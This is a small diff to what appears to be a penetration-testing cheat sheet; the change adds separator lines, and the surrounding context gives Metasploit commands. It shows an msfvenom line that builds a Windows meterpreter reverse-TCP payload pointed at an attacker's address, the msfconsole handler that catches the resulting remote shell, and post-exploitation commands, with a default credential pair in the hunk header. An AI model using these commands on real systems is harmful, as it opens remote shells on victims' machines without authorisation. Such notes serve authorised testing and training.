@@ -57,11 +57,13 @@ admin:changeme
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
 
+----------------------------------
 msfconsole:
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp   # payload match with the one used in venom
 run     # start listener
 
+----------------------------------
 meterpreter session:
 getuid     # get current user session
 sysinfo    # get information of the remote system
